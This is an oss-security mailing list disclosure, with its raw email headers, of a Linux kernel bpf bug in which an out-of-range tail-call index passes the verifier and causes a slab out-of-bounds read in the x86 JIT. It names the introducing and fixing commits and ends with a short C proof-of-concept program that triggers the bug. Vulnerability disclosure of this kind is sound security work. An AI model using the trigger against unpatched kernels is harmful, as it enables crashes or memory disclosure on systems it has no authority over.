Received: (qmail 3713 invoked by uid 550); 26 Aug 2022 06:57:42 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3119 invoked from network); 25 Aug 2022 23:08:24 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=uci-edu.20210112.gappssmtp.com; s=20210112;
        h=to:subject:message-id:date:from:mime-version:from:to:cc;
        bh=btkF8iBwI/SZHNzQOkxQ3Qq/NrdthFbad93AsSvbI08=;
        b=qrJ8214o2Y3mGwLHnqNbpdPNcqcqwJtZhF5TTn3qAi0FNyFJmN7oVtefTEtxjwbZxU
         +FukaI2xNA3cTJj12maQQ1ksUUjWFAfeZBhU4ikMVu2nXMecDXQJrpA4flTB5wRzTaBL
         GAAkgbWe+BJ8dL1aM0r4Vit9GqIsyJZjg99jrqjC+q6HrU5jjVMW0jLOw2P17x/pjF95
         2t+gByDxuWi/QbLn1vaRYOxtJ6WuarMLyYyCpHpfFvHopSrp5+LHblWmdzcvLvnmK7Zj
         zJjliJco2Zhjpq2sXfJGmwzP8I4y8J6MphRtrDgIQfmnsskhNeccTEd8SpA8fLDXeLtX
         O3vg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc;
        bh=btkF8iBwI/SZHNzQOkxQ3Qq/NrdthFbad93AsSvbI08=;
        b=P5PaHonTpJxNNHWzQrcrpwiDDcLC1ac5m+KO/yN7htrX1WC6j/uFWwOVpTHyDi6Ogk
         5+YK9bQ5dX6jPlet7/zXLFmdUltDGw3JqOtkJXDfg/0NEwDYbijomXi3sDAoqhTd+gU2
         hx5eIy6Hb83S46kXNfNTWzmSfV/I8tIFK8EHxKeyK+fxmGHL0sbuhDx3xTbXlgqpVhrW
         5kKRmHMtMVZUopDBgyR4vprKTkZCfVs0vR3RNrN9qlffd5gJpLLxQJEdOVrP2oFsqvL/
         i2Flj1H+K4NopT5POiC2UZsbeNtbhoF7Vz5lpDb9t7Hz3Kwu/yyWxBApZ++UKaIedQ8a
         F73g==
X-Gm-Message-State: ACgBeo0XSUcQy8vvcg1utbtPeEhekgDxcUXENakqG0nIPAVh5dWVEOry
	4MzBwF9l3mq4yKKL/ewjkcameQBql/zQHmwdjkVoOTUlOwwXIg==
X-Google-Smtp-Source: AA6agR5kvjQ1LZltKTXuKYgPCzvql38leR+0ebMWGWK8C14AaIqm//sKDxEH6dyqeMZubrjPnzUontVqgpCbAn5xKiY=
X-Received: by 2002:a05:6638:537:b0:349:b5d2:9182 with SMTP id
 j23-20020a056638053700b00349b5d29182mr2793251jar.5.1661468892015; Thu, 25 Aug
 2022 16:08:12 -0700 (PDT)
MIME-Version: 1.0
From: Hsin-Wei Hung <hsinweih@uci.edu>
Date: Fri, 26 Aug 2022 07:07:36 +0800
Message-ID: <CABcoxUaK1ipxFP3==j+57mWXYadiHNd_eNgzKSxJ6Y0cM4WnyA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="0000000000001d465605e718df50"
Subject: [oss-security] Linux kernel slab-out-of-bound read in bpf

--0000000000001d465605e718df50
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi,

We found an issue in the bpf subsystem of the Linux kernel that can cause a
slab-out-of-bound read. A bpf program calling bpf_tail_call with an index
larger than the max_entries can potentially pass the verifier. After that,
it will cause an out-of-bound access in the x86 JIT compiler. The root
cause is that tnum_range over-approximates the range of concrete values.

Affected kernel starts from v5.5 since commit, d2e4c1e6c294 (=E2=80=9Cbpf: =
Constant
map key tracking for prog array pokes=E2=80=9D)

It has been fixed in commit, a657182a5c51 ("bpf: Don't use tnum_range on
array range checking for poke descriptors") in bpf/bpf.git.

The following code is a bpf PoC that can trigger the bug.

#include "/usr/local/include/vmlinux.h"
#include "/usr/include/bpf/bpf_helpers.h"

#define __uint(name, val) int (*name)[val]
#define __type(name, val) typeof(val) *name
#define __array(name, val) typeof(val) *name[]

#define SEC(name) \
        _Pragma("GCC diagnostic push")                                  \
        _Pragma("GCC diagnostic ignored \"-Wignored-attributes\"")      \
        __attribute__((section(name), used))                            \
        _Pragma("GCC diagnostic pop")

#define DEFINE_BPF_MAP(the_map, TypeOfMap, MapFlags, TypeOfKey,
TypeOfValue, MaxEntries) \
        struct {                                                        \
            __uint(type, TypeOfMap);                                    \
            __uint(map_flags, (MapFlags));                              \
            __uint(max_entries, (MaxEntries));                          \
            __type(key, TypeOfKey);                                     \
            __type(value, TypeOfValue);                                 \
        } the_map SEC(".maps");

DEFINE_BPF_MAP(map_0, BPF_MAP_TYPE_PROG_ARRAY, 0, uint32_t, uint32_t, 36);
SEC("cgroup/sock_create")
int func(struct bpf_sock *ctx) {
        int64_t v0 =3D 49;
        bpf_tail_call(ctx, &map_0, v0);
        return 0;
}
char _license[] SEC("license") =3D "GPL";


Thanks,
Hsin-Wei

--0000000000001d465605e718df50--
